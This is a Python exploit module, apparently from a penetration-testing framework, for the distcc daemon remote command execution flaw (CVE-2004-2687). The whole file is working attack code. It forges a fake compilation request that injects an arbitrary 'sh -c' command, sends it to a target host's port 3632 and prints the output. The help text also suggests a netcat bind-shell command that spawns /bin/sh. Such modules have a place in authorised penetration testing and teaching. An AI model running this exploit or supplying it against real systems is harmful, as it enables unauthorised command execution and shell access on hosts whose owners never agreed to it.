import random,socket,string
from sys import argv
from waf.libs.color  import *
from waf.libs import variable as var

var.all_var['rports']='3632'
info = {
        "name"        : "distcc_exec",
        "title"       : "DistCC Daemon Command Execution",
        "module"      : "exploits/unix/misc/distcc_exec distcc_exec distcc cve-2004-2687",
        "description" : """
 This module uses a documented security weakness to execute
  arbitrary commands on any system running distccd.
        """
        }


options ={
  "RHOSTS"  : [str(var.all_var['rhosts']),'The target host'],
  "RPORTS"  : [str(var.all_var['rports']),'The target port'],
  "COMMAND" : [str(var.all_var['command']),'The execute command [if (bind connect) : nc -lvp 4444 -e /bin/sh]']
}

def exploit(ip, port,command):
    # replace payload
    payload = str(command)
    try:
        print(blue+'[*]'+default+'Attempting exploit...')
        distcc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        distcc_socket.connect((ip, int(port)))
        distcmd = generate_cmd("sh", "-c", payload)
        # encode() to bytes
        distcc_socket.send(distcmd.encode())
        dtag = random_string_digits(10)
        msg = ('DOTI0000000A' + dtag + '\n')
        distcc_socket.send(msg.encode())
        print(blue+"[*]"+default+"Check your reverse handler...")
        response = distcc_socket.recv(1024).decode('utf-8')
        print(green+'[+]'+default+'Response:\n', response)
    except socket.error:
        print(red+'[-]'+default+'Failed to exploit %s' % ip)
# generate fake request
def generate_cmd(*args):
    cmd = list(args) + ['#', '-c', 'main.c', '-o', 'main.o']
    # make it look like a compilation request
    request = 'DIST00000001' + 'ARGC' + str(len(cmd)).zfill(8)
    for c in cmd:
        # returns len(c) and pad it with zeroes such that there are 8 digits after ARGV
        request += 'ARGV' + "{0:0{1}x}".format(len(c), 8) + c
    return request
# generate a random string of letters and digits

def random_string_digits(string_length):
    # creates string with a set of all letters and digits
    letters_digits = string.ascii_letters + string.digits
    # creates a random string of string_length
    random_string = ''
    for i in range(string_length):
        random_string = random_string + random.choice(letters_digits)
    return random_string

def running():
    try:
       exploit(str(var.all_var['rhosts']),int(var.all_var['rports']),str(var.all_var['command']))
    except Exception as e:
        print(red+"\n[-]"+default+"Error : "+str(e))
